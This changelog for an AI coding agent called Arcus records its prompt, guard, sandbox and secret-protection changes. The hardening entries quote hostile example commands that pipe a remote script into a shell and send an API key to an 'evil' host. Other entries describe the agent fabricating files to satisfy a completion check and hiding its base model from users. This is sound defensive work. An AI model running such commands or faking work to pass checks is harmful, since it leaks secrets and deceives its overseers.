# Changelog

Point-in-time record of substantive changes, so the live README / DATASHEET / ROADMAP can describe the
*current* state without carrying history. Each numbered spec (`specs/NNNN-*.md`) remains the authoritative
per-change design record; this is the index. Newest first.

## Model runtime

The inference model is an env-boundary (`CODE_MODEL` / `CODE_API_BASE` / `CODE_API_KEY`), so every move
below was a `.env` change, never a code change:

- **Inkling-Small on Thinking Machines' Tinker** *(current)* — `CODE_MODEL=openai/thinkingmachines/Inkling-Small:peft:262144`,
  Tinker's OpenAI-compatible endpoint, 256k window. Native tool-calling + streaming confirmed; `reasoning_effort`
  accepts `low`..`xhigh` (xhigh = 0.99 = max); `separate_reasoning` defaults on, so `reasoning_content` is returned.
- **thinkingmachines/Inkling on Together** — `https://api.together.xyz/v1`, OpenAI-compatible.
- **gpt-oss-120b on AWS Bedrock / self-hosted vLLM (RunPod)** — the original baseline; last measured eval 13/13.

## Features (specs/0022–0092)

- `0092` **advisory / conversational register** — used as a research / design thought-partner (a near-empty
  workspace, "review this doc", "research these claims", "what do you think about the free tier?"), Arcus
  collapsed every substantive turn into a status receipt — `Claims verified: X - CONFIRMED`, `=== SUMMARY FOR
  USER ===`, `Status: Ready for next instruction` (log `7170fa4eb4dd`) — because the prompt models only a
  code-editing task executor and `native_tools_note` pins the final reply as "a short final summary" of the work.
  `CODE_ADVISORY_REGISTER` adds the missing register: `build_system_prompt` appends one ADVISORY note (explain /
  research / weigh / "what do you think" is not a code task → substantive prose, never a receipt; the
  VERIFY/verified vocabulary is internal discipline, not the user-facing voice; reply as prose, never
  `Write-Output` it) and `native_tools_note` reshapes the final-reply line to "the answer the user asked for".
  Scoped to the **user-facing** top-level turn (a new `user_facing` flag threaded `run_subagent → build_agent →
  build_system_prompt`): a guardian/grounding/review subagent keeps the plain prompt so its terse
  APPROVE/DENY · GROUNDED/UNGROUNDED verdict contract is never pushed toward prose (an adversarial review caught
  the register leaking into the guardian and risking a spurious DENY). Default OFF → byte-identical.
  (`scripts/check_advisory_register_0092.py`, 21/21.)
- `0091` **subagent budget** — the biggest run-cost multiplier is subagent fan-out: a `review_repo` covers up to
  `CODE_MAX_REVIEW_AREAS` areas and **each is a full agent loop**, and every spawned child inherited the main
  agent's max reasoning pin (`xhigh`) and full 50-step budget while doing cheap work (read a folder, summarize, a
  verdict). Two new knobs make spawned children cheap without touching the main agent: `CODE_SUBAGENT_EFFORT` (the
  reasoning effort a child runs at when its caller didn't pin one — an explicit `CODE_GROUNDING_EFFORT`/
  `CODE_GUARDIAN_EFFORT` still wins) and `CODE_SUBAGENT_MAX_STEPS` (a smaller child step budget). Wiring:
  `run_subagent` fills `effort` from `SUBAGENT_EFFORT` only in the `None` case and passes `max_steps` to a new
  optional `build_agent(max_steps=…)` param. Both default OFF → byte-identical. Live `.env` arms them (`low`/`12`)
  alongside the pre-existing count knobs (`GUARDIAN_EFFORT=low`, `MAX_REVIEW_AREAS 16→6`, `FANOUT 8→3`,
  `DEPTH 2→1`); the main agent's `xhigh`/`MAX_STEPS=50` are untouched. (`scripts/check_subagent_budget_0091.py`.)
- `0090` **lean prompt, pass 2** — extends `CODE_LEAN_PROMPT` to the secondary prompts the inventory flagged:
  15 leaner tool descriptions (a `_LEAN_DESC` map + `desc_for`, used by both `openai_schemas` and the json
  protocol), lean WEB/PROPOSE/SPEC notes in `build_system_prompt`, a lean PowerShell footgun list (alias catalog
  dropped), a lean review_repo trailer, and a lean grounding anti-collapse challenge. The assembled system prompt
  (native, all 25 tools) drops 17,993 → 9,203 chars (48%) on top of the lean BASE_PROMPT. Every machine contract
  is preserved (apply_patch envelope, pursue argv-list bar, web untrusted+cite, update_plan `file` hook, the
  0088 review-digest anchor). Default OFF → byte-identical. (`scripts/check_lean_prompt2_0090.py`, 14/14.)
- `0089` **lean system prompt** — BASE_PROMPT had grown to 9,802 chars / 116 lines sent EVERY turn; an
  exhaustive extraction of every model-facing prompt found it the single biggest bloat source (the honesty theme
  restated across ~7 bullets, review-behavior across ~6), which a model treats as many literal constraints —
  amplifying the over-obedience behind the recent failures. `CODE_LEAN_PROMPT` swaps in `LEAN_BASE_PROMPT`
  (~81% smaller: a role line + 6 tight bullets — read-before-claim, workspace scoping, edit/delete mechanics,
  verify-don't-declare, review = read-only + substantive + review_repo, answer directly). Same identity/tool/
  memory wiring; dropped clauses are redundant elaboration the gates/tools already enforce. Default OFF →
  byte-identical; reversible for lean-vs-full comparison. (`scripts/check_lean_prompt_0089.py`, 14/14.)
- `0088` **review substance** — stop a review collapsing into a receipt. A whole-project review kept returning
  "Review complete. 9 folders covered. No edits made." instead of the review, because BASE_PROMPT ORDERED
  brevity ("Be concise… keep reviews tight") and a weak model over-obeyed, collapsing the review to a status
  line that narration-as-final then shipped. Fix: (1) rebalance the prompt (BASE_PROMPT + review_repo trailer) so
  a review must give the actual per-area assessment + findings and NEVER a "review complete" receipt; (2)
  `CODE_REVIEW_DELIVER_DIGEST` structural backstop — if the model still collapses a `review_repo` synthesis into
  a receipt, deliver the substantive per-area digest the fan-out children built (trailer stripped), on both the
  narration-print and content delivery paths. Default OFF → byte-identical.
  (`scripts/check_review_digest_0088.py`, 5/5.) Not fixed: a polished opinion synthesis (a stronger-model
  capability) — the backstop guarantees findings, not synthesis.
- `0087` **grounding anti-collapse / anti-hijack** — stop the grounding gate eating the answer. Across 4 sessions
  a "review my project" turn returned a verification RECEIPT ("Confirmed: style.css exists") instead of the
  review: a flaky semantic verifier FABRICATED filesystem facts (flagged `../style.css` "not found" when it
  exists; claimed `Agent.py` "present" to reject a correct absence claim), and the correction re-prompt
  ("output your corrected answer and nothing else") made the weak model collapse the whole review into the
  receipt. `CODE_GROUND_ANTI_COLLAPSE`: drops a verifier flag the real tree contradicts (model-free
  cross-check), rewords the challenge to RE-SEND the complete answer, and delivers the fuller original if a
  correction still collapses. `.env` also sets `CODE_VERIFY_GROUNDING_SEMANTIC=false` for immediate relief
  (keeps the deterministic path check). Default OFF → byte-identical. (`scripts/check_ground_anticollapse_0087.py`,
  12/12.) Not fixed: the shallow stats-print review on the direct-read path (a model limitation).
- `0086` **compaction / resume de-poison** — 0085 stops a narration loop forming; 0086 cleans one already in the
  history. A resumed looped session compacts hundreds of no-op `Write-Output` narration turns + "STOP" nudges
  into a loop-saturated summary that re-primes the behavior (seen live: a resumed "hi" returned only "No
  narration - direct reply delivered."). `CODE_COMPACT_DROP_NOISE`: `context.drop_narration_noise` strips the
  no-op narration turns (+ their tool results, pairing-safe) and nudge messages before the history is summarized
  AND when a session is resumed, so the model sees the real work. Default OFF → byte-identical.
  (`scripts/check_depoison_0086.py`, 10/10.)
- `0085` **narration-as-final** — the ROOT fix for the narration loop (not another counter). In native tool mode
  a turn with any tool call has `final=None` (planner.py), so a weak model that "replies" by printing —
  `run_command(Write-Output "answer")` — is executed as a no-op and loops, never emitting a clean finish (seen
  live: Inkling-Small emitting the identical print every step while its own reasoning said "no tool calls").
  `CODE_NARRATION_AS_FINAL`: when a step's ONLY calls are pure-narration prints, END the turn with the printed
  text as a clean `final` the FIRST time — the loop never forms, superseding the narration-stall guard for the
  reply case. Default OFF → byte-identical. (`scripts/check_narration_final_0085.py`, 7/7.)
- `0084` **subagent propose-deadlock fix + no-progress stall breaker** — kills the "dramatic looping"
  root-caused from a live log (113 "propose mode is read-only" denials, 23 "propose_changes is top-level only").
  An auto-spawned grounding verifier (depth>0) INHERITED propose mode, where it could neither mutate nor approve
  — a deadlock (documented at permissions.py:372). `CODE_SUBAGENT_NO_PROPOSE` projects such a child to plan-mode
  read-only (honest "stop and report up"), and spawns the grounding/guardian verifiers read-only in every mode.
  `CODE_STALL_MAX` adds the general backstop the narration guard can't be: a step with no NOVEL successful work
  (denied / failed / pure-narration / DUPLICATE) increments a streak that — unlike the denial/narration counters
  — does NOT reset on an interleaved allowed-but-useless call; N in a row → one nudge then an honest `stall`
  outcome (added to `GATE_OUTCOMES`). The REPL now prints a "stopped early" note on max_steps/stall so a
  truncated recap isn't mistaken for a finished answer. All flags default OFF → byte-identical.
  (`scripts/check_stall_0084.py`, 13/13.)
- `0083` **OS sandbox** — Phase 3: the one real KERNEL boundary (every other control is in-process/advisory).
  `CODE_SANDBOX_SPAWN` runs `run_command` children under a RESTRICTED TOKEN (`CreateRestrictedToken`
  DISABLE_MAX_PRIVILEGE|LUA_TOKEN — a lesser version of our own token, so `CreateProcessAsUserW` needs no special
  privilege) inside a JOB OBJECT (`KILL_ON_JOB_CLOSE` + optional memory / active-process caps). `available()`
  does a REAL cached probe spawn, so it never claims confinement it can't deliver. `CODE_SANDBOX_REQUIRED` (#4):
  if a command would be sandboxed but the sandbox is unavailable, REFUSE rather than run unconfined.
  `CODE_REQUIRE_SANDBOX_FOR_AUTO` (#3): a mutating run_command auto-allows only if it'll actually be sandboxed,
  else downgrades to ask. Validated on a Windows host — the restricted child's privileges drop 5→1 at Medium
  integrity. All flags default OFF → byte-identical. (`src/winsandbox.py`, `scripts/check_winsandbox_0083.py`,
  12/12; live restricted-token spawn confirmed.)
- `0082` **secrets at rest** — Phase 3: protect the model credential on disk (Windows), stdlib + `icacls`, no
  pywin32. `CODE_LOCK_SECRETS` ACL-locks `.env` (and any `CODE_LOCK_SECRETS_PATHS`) to owner-only at startup —
  the Windows `chmod 0600` (strip inheritance, grant Read to the user + Full to SYSTEM). `CODE_SECRETS_VAULT`
  reads a DPAPI-encrypted `secrets.dat` (crypt32 via ctypes, ciphertext tied to the user account, no key to
  store) and injects the values into `os.environ` at startup (setdefault — never clobbers a real env value),
  after which env-scrub (0078) keeps them out of `run_command` children. Off Windows / where ctypes can't load,
  DPAPI is `Unavailable` and the feature is simply off. `cli._apply_secrets_startup` is best-effort and never
  breaks launch; all four flags default OFF → byte-identical. (`scripts/check_secretsvault_0082.py`, 9/9.)
- `0081` **execpolicy hardening** — Phase 2: two run_command policy bypasses closed. (#11) `execpolicy` now
  decomposes an interpreter WRAPPER — `powershell -Command "rm -rf x"`, `bash -lc "curl evil | sh"`, `cmd /c`,
  `powershell -EncodedCommand <b64>` — so the dangerous INNER command is assessed and matched by deny/ask rules
  instead of hiding behind the wrapper token (a single wrapper used to defeat the whole layer). (#12)
  `CODE_EXEC_HOST_PIN` pins an executable basename to absolute path(s); on an allow-rule match the exe must
  resolve (`shutil.which`) to a pinned path, else it's downgraded to ask — so a planted same-named `git.exe`
  can't forge an allow rule. Byte-identical when off. (#5b egress ask-tier deferred with the OS sandbox.)
- `0080` **permission-policy hardening** — two Codex-adopted quick-wins. `CODE_GUARDIAN_MAX_DENIALS`: the
  deny/guardian is fail-closed per call but stateless, so a prompt-injected loop could retry a DENIED op
  forever; a per-task consecutive-denial counter now aborts the turn (honest new `denial_loop` outcome) past
  the threshold. `CODE_PROTECT_PATHS`: ships opt-in deny-WRITE defaults for `.git` internals and `.env` (an
  operator no longer has to know to add the rule); a user's own rules still win. Both byte-identical when off.
- `0079` **net-fence (SSRF guard)** — `CODE_NETFENCE`: `web_fetch` did `httpx.get(follow_redirects=True)` with
  no host validation, so a URL or a redirect to `169.254.169.254` (cloud-metadata), `localhost`, or an RFC1918
  host reached the machine's own network. `src/netfence.py` now refuses any host resolving to a non-public IP
  (loopback/RFC1918/link-local/metadata/CGNAT/ULA), fail-closed on an unresolvable host, re-checked at EVERY
  redirect hop (redirects followed manually). Byte-identical when off. `run_command` egress stays advisory
  (Phase 2) — Windows has no netns for a pure-Python kernel boundary.
- `0078` **secret-exfil hardening** — Phase 1 of adopting Codex's security posture (a Codex-vs-OAC review found
  secrets were freely exfiltrable). Three default-off flags: `CODE_ENV_SCRUB` spawns `run_command` children with
  an allowlisted env (drops `CODE_*` + `*api_key*`/`*secret*`/`*token*` vars) so a child can't
  `echo $env:CODE_API_KEY | curl evil`; `CODE_SECRET_DENY_READ` denies `read_file` of a designated secret file
  (`.env`/keys) and skips them in grep/glob/tree; `CODE_SCRUB_OUTPUT` runs the scrubber over live `run_command`
  output before the model sees it. Removes the exfil path itself — the tool/env layer; an OS sandbox
  (`CODE_WIN_SANDBOX`) + net-fence are the later phases. No OS primitive required.
- `0077` **train / harness-audit** — the final bug-hunt batch: `train/curate.py` `_seen_blob` normalizes
  backslashes so a Windows-discovered file (`src\main.py`) grounds its `/`-normalized citation instead of being
  dropped as a phantom; and three harness weaknesses are fixed — `check_scrub`'s opt-in check was a tautology
  (now asserts the config source default), and two `check_verify_gate` assertions were vacuous (now prove the
  only-log-the-final-result rule and that the gate actually ran with label off). No new flag.
- `0076` **fan-out & robustness** — six fixes: the hook timeout is now enforceable on Windows (Popen +
  process-group + `_kill_tree`, so a hung grandchild is actually killed); `_balance_plan`'s review-coverage
  check is exact per folder (a folder whose name was a SUBSTRING of an area label no longer falsely counts as
  covered); over-cap workflow phases are surfaced in the digest, not dropped silently; subagent
  error-containment now wraps child construction (`Trajectory`/`build_agent`); `grep` on a FILE path searches
  the file instead of returning a false `(no matches)`; and the narration guard treats a newline outside quotes
  as a second statement (a multiline command with real work isn't misread as pure narration). No new flag.
- `0075` **model-io & import robustness** — seven fixes: ~34 bare `int()`/`float()` config parses that crashed
  EVERY run at import on a typo now fall back via `_env_int`/`_env_float`; a Bedrock throttle
  (`RateLimitError`, "too many tokens") is now retryable instead of fatal; the WEB system-prompt note stopped
  CLOBBERING the `CODE_WORKDIR_PROMPT` pin (`note +=`, not `=`); `--warmup <non-number>` is a usage error not a
  traceback; `show_reasoning` resets the console dim style even on a mid-stream error (`try/finally`); a custom
  `CODE_REASONING_PARAM` overrides the effort ladder regardless of value shape; and an output-cap truncation
  is no longer misdiagnosed as a cold worker. No new flag.
- `0074` **resume integrity** — six resume-cluster fixes, incl. two that PERMANENTLY broke a session:
  `sanitize_tail` is now a full-history tool-pairing scan (a MID-list / partial-results dangling `tool_use` is
  stubbed or dropped instead of poisoning every later step); `--resume` no longer crashes on a truncated last
  JSON line (`_load_records` skips it); ALL stale `role:'system'` env blocks are filtered on rehydrate (not
  just a leading one); mid-session `/add-dir`/trusted-dir grants are persisted as typed `dir_grant` records and
  replayed by tier; and `JsonPlanner`'s nudge budget resets per task. No new flag; session.py's model imports
  made lazy so its pure helpers stay dep-free.
- `0073` **gate-honesty** — six corpus-poison / gate-bypass fixes: `ran_check` no longer flips "verified" on
  `mkdir build`/`git checkout build`/`npm run dev` (matches only real tools / `<tool> <verb>`); `ran_healthcheck`
  no longer flips "service up" on any URL like `git clone https://…` (only a real probe tool counts); a
  timed-out verifier now records a FAILED check instead of a PASS; grounding sees Windows `src\main.py`
  citations (backslash added to `_QUOTED`); the scrubber redacts UNQUOTED `.env`/export secrets
  (`API_KEY=…`, `password: …`); and the card regex requires the grouped 4-4-4-4 form so a 16-digit epoch/id no
  longer false-matches. No new flag.
- `0072` **log-review fixes** — four NOVEL bugs a full `logs/*.log` review surfaced: (N1) a missing required
  tool arg leaked a raw `KeyError` to the model — `Registry.run` now validates schema `required` args and
  returns "missing required argument: 'path'"; (N2) a subagent under propose mode was deadlocked (can't mutate,
  can't approve) with a misleading deny — the propose deny is now depth-aware and tells a child to report up;
  (N3) Windows `run_command` output mojibake (cp1252 decoded as utf-8) — a UTF-8 prelude forces PowerShell
  output to match the decode; (N4) `2>&1` on a native exe flips the exit code so success reads `[FAIL]` — a
  `CODE_SHELL_HINTS` clause warns against it. No new flag.
- `0071` **security-boundary hardening** — four verified bug-hunt findings, all default-on: (1) `print_tree`
  escaped the workspace fence because its `→tree` alias resolved AFTER the permission gate — now canonicalized
  before it (`permissions._canonical_tool`); (2) the self-kill guard was bypassed by the idiomatic
  `Get-Process python | Stop-Process` — now checked per-statement (kill-verb AND `python` token in either
  order, pipe stays in-statement), also catching `taskkill /IM python3.exe`; (3) `/add-dir` said "granted
  (read)" but appended to write-capable `extra_roots` — now routes to `read_only_roots` so writes are denied;
  (4) the goal entry filter missed `python3.12 -c` / `pythonw` / `nodejs -e` — now matched via a regex. No new
  flag.
- `0070` **REPL crash honesty** — the CRITICAL bug-hunt finding: a REPL turn that crashed mid-run (a Bedrock
  503) logged no `turn_outcome`, so a crash-only session was stamped `session_end='completed'` and
  `train/convert.py`'s legacy branch trained the truncated partial turn as a success (corpus poison). The
  except branch now stamps the turn `error` (written directly, not via `classify`, which would wash it to
  `completed`), routing convert to the per-turn path that drops it — one fix closing three findings (the legacy
  misroute and the `to_rows` counter skew too). Also: `Ctrl-C` mid-turn (a `BaseException`) now ends the turn
  and returns to the prompt instead of killing the whole REPL with a traceback. No new flag.
- `0069` **narration detector: quoted text** — closes the hole that let a SECOND live narration loop through
  the 0067 guard: punctuation inside the quoted message (`;`, `|`, `>`, `$?`) misread as shell operators,
  resetting the consecutive streak so the guard never fired. Operators now only count OUTSIDE the quoted
  spans; `$(` stays fatal anywhere (a PowerShell subexpression executes even inside double quotes);
  unbalanced quotes err conservative (guard doesn't fire). No new flag.
- `0068` **volunteered-identity strip — WITHDRAWN** — post-filtered a volunteered "I am Arcus, created by …"
  out of the final answer. Withdrawn same-week at the operator's direction: identity is never to be
  scrubbed/stripped from output — it's fixed at the model-format level (0063 block + 0066 scoping, which the
  next live run confirmed holds on its own). Code, flag, and harness removed; specs/0068 records the design
  and the withdrawal.
- `0067` **narration-stall guard** — `CODE_GUARD_NARRATION_STALL`: a weak model that finished but won't END the
  turn fills dead air with side-effect-free `run_command('Write-Output "Status…"')` — dozens in a row, burning
  steps and poisoning the corpus (seen live on a review that just needed to ask "which next?"). N consecutive
  narration-only steps trip a bounded nudge to finalize, then an honest new `narration_stall` outcome (added to
  `GATE_OUTCOMES`, so it's never washed to completed). Conservative detector: a read/pipe/redirect/chain never
  trips it. Cousin of the greenfield guard (0058) and the text-repetition degeneracy guard.
- `0066` **identity scope** — the specs/0063 `<model_information>` directive is scoped so the agent states its
  identity ONLY in direct answer to an identity question and NEVER volunteers it. Fixes a live over-correction
  where the block's inherited announce-reflex appended "Also — I am Arcus, created by Islander Intelligence" to
  ordinary replies — the soft `CODE_PROMPT_HYGIENE` "don't announce" rule kept losing to the concrete block, so
  the constraint (REFERENCE only; never open/close/append the identity) now lives INSIDE the directive itself.
  Byte-identity anchor unchanged (directive still ends at `…model provider.`). No new flag; a deterministic
  strip is the reserved follow-up if the prompt fix doesn't hold live.
- `0065` **read-only integrity** — the completion gate (specs/0007) no longer traps a READ-ONLY review into
  fabricating file changes. A plan step whose `file` is a directory (`Centpilot`) or a bare placeholder
  (`N/A`, `TBD`) is not a file mutation, so it can never be "not backed" — challenging it was unsatisfiable and
  escalated the agent into writing junk files to feed the gate. `agent._is_checkable_target` gates the
  challenge to REAL file targets (an existing file, or a path with an extension), so an edit-that-didn't-land
  and a create-that-never-happened still flag while a review step does not. The challenge text now offers the
  read-only exit (drop the file with `update_plan`; never create/edit/delete to satisfy the check), a
  `CODE_PROMPT_HYGIENE` `(read-only integrity)` clause forbids fabrication-to-satisfy, and the sibling
  `_unapplied_manifest` gets the same directory guard. No new flag. Caught live via `CODE_SHOW_REASONING`.
- `0064` **show reasoning** — `CODE_SHOW_REASONING`: tee the model's separate reasoning channel to the console
  live (a dimmed "thinking" stream above the answer) so you can watch it reason. Top-level REPL only (subagents
  / eval stay silent by construction); needs `CODE_STREAM`; display-only (reasoning is already in the trajectory).
- `0063` **agent identity block** — `CODE_AGENT_IDENTITY_BLOCK`: inject a structured `<model_information>`
  block (Name / Overview / Creator / Context window) in the SAME format the base model treats as
  authoritative, plus an "answer consistently with the above; never name an underlying model/provider"
  directive — so the agent reports Arcus instead of "Inkling, created by Thinking Machines." Fixes the cause
  (the trained-in identity contract) where the soft line (0036) and hygiene rule (0061) both failed.
- `0062` **context self-state** — `CODE_CONTEXT_SELF_STATE`: append the agent's current reasoning effort
  (`config.display_effort()`, e.g. `xhigh`) to the per-turn situational block, so when asked "what reasoning
  level are you at" it reports the real value instead of confabulating. Model id deliberately omitted (0061).
- `0061` **identity hardening** — extends the `CODE_PROMPT_HYGIENE` identity clause so that when asked who/what
  it is, the agent identifies as its configured name (Arcus) and NEVER reveals the underlying base model or
  provider. Fixes a live "I am Inkling, created by Thinking Machines Lab" — a name-and-sovereignty leak. No
  new flag.
- `0060` **effort-pin precedence** — adaptive effort (specs/0021, capped at `high`) no longer silently
  DOWNGRADES a pinned reasoning pass-through it can't represent (`CODE_REASONING_VALUE=xhigh`): when a
  non-ladder value is pinned, the escalation block is skipped so `xhigh` is applied every turn instead of
  being overridden to `high` the moment the run struggles. No new flag.
- `0059` **trajectory scrubbing** — `CODE_SCRUB_TRAJECTORY`: scrub secrets (private keys, JWTs, provider API
  keys, bearer/CSRF/session tokens, emails) and financial PII (currency amounts, account IDs, cards/SSNs)
  from each trajectory record at the single write choke point, before it hits disk — so a pasted budget or
  session token never enters the training corpus. Persisted copy only; the live agent is unaffected.
- `0058` **greenfield absence** — on a STRICTLY-empty workspace, an absence claim ("the workspace is empty",
  "no X here") no longer spawns the Tier-2 verifier (it's trivially true), killing the re-listing loop where
  the empty-Centpilot run re-ran `Get-ChildItem` turn after turn. A non-empty scaffold still verifies. Rides
  `CODE_GROUND_SKIP_GREENFIELD`; no new flag.
- `0057` **interactive guardian** — `CODE_GUARDIAN_INTERACTIVE`: the AI guardian adjudicates ask-tier commands
  in the REPL too — auto-approves the clearly-safe, on-request ones (a curl health-check, node -c, a build
  step), and defers anything it won't clear to the human `[y/N]`. Deny-rules / fence / mass-destruction cap /
  self-kill guard still apply. Makes "verify it runs" flow without a prompt for every probe.
- `0056` **runtime-done broaden** — widens the `CODE_VERIFY_RUNTIME_DONE` net to catch "Centpilot runs",
  "verified running", and "deploy fixed" (workspace-name subject + verified/deploy vocabulary) that 0053
  missed on a live run. No new flag.
- `0055` **non-interactive shell** — `CODE_SHELL_NONINTERACTIVE`: `run_command` runs PowerShell with
  `-NonInteractive` and the child's stdin as DEVNULL, so a command that reads stdin (a bare `echo` /
  Read-Host / a foreground prompt) fails fast instead of HANGING the REPL. Paired shell-hint against bare `echo`.
- `0054` **auto-window probe UA** — `_fetch_context_length` sends a browser `User-Agent` so the
  `CODE_MODEL_MAX_TOKENS=auto` context-window probe isn't 403/1010-blocked by Cloudflare on Tinker (which is
  why "auto window unresolved" kept the 131072 fallback). No new flag; pinning the window is still preferred.
- `0053` **runtime-done honesty** — `CODE_VERIFY_RUNTIME_DONE`: flag a "service is up / serving / plumbed"
  claim when no health-check (curl / http-get / port probe) returned ok this turn; the runtime twin of the
  unverified-success net. Closes a live false "Done — plumbing fixed" while `curl :8080` was refused.
- `0052` **propose first-approval backstop** — `CODE_PROPOSE_AUTOPLAN`: a read-only deny in propose mode
  becomes an interactive "approve + unlock? [y/N]", plus a `/approve` REPL command, so propose is never a
  dead-end when the model doesn't call `propose_changes`. Under deny-rules + the fence.
- `0051` **prompt hygiene** — `CODE_PROMPT_HYGIENE`: one system-prompt note — persona is a silent style, no
  arguing with the user, propose-first-with-recovery, service-up honesty — plus the PowerShell 5.1 shell-hint
  gaps (`head`/`tail` → `Select-Object`, `$?` → `$LASTEXITCODE`, `tree` has no `-Depth`).
- `0050` **self-preservation** — `CODE_GUARD_SELF_KILL`: hard-deny a name-based process kill that would end
  the agent's own `python` process (e.g. `Stop-Process -Name python`), in every mode incl. bypass.
- `0049` **extra-body** — `CODE_EXTRA_BODY`: merge arbitrary JSON params into the request `extra_body`.
- `0048` **propose follow-through** — `CODE_PROPOSE_RUN/EXTEND/PERSIST_AFTER_APPROVAL`: run/test, prompted
  extend, or scoped-bypass after a manifest approves, without re-proposing.
- `0047` **grounding early-stage** — `CODE_GROUND_GREENFIELD_MAX`: treat a small early scaffold as greenfield
  so grounding stops flagging build-session stub files.
- `0046` **shell-hints** — `CODE_SHELL_HINTS`: PowerShell 5.1 command rules in the env block on Windows.
- `0045` **auto-max-tokens** — `CODE_MODEL_MAX_TOKENS=auto` + optional per-request output cap.
- `0044` **reasoning-control** — `CODE_REASONING_PARAM/VALUE/TOPLEVEL`: pass-through for any reasoning param.
- `0043` **streaming** — `CODE_STREAM`: stream the primary model turn, reassembled to an equivalent response.
- `0042` **launch-flag validation + greenfield guard** — reject a mistyped `--mode`; `CODE_GROUND_SKIP_GREENFIELD`.
- `0038`–`0040` **workflows** — multi-phase engine, bounded parallel fan-out, async background runtime.
- `0035`–`0037` **trusted user dirs**, **agent naming** (`--set-name`/`--remove-name`), `$PROFILE` register.
- `0022`–`0034` **propose mode**, project todos, web tools, declared-done family, spec-first, skills,
  compaction-window safety, and the situational/attribution fixes. (Adoption-track `0012`–`0021` predate this
  window; see ROADMAP.)

All feature flags default OFF and are byte-identical when off; the trajectory `schema_version` is `0.13.0`.

## 0.1.0

Initial scaffold: agent loop, six tools (exact-match edit), LiteLLM gateway, schema-versioned trajectory
capture, mandated verification, eval harness. Standalone CLI.
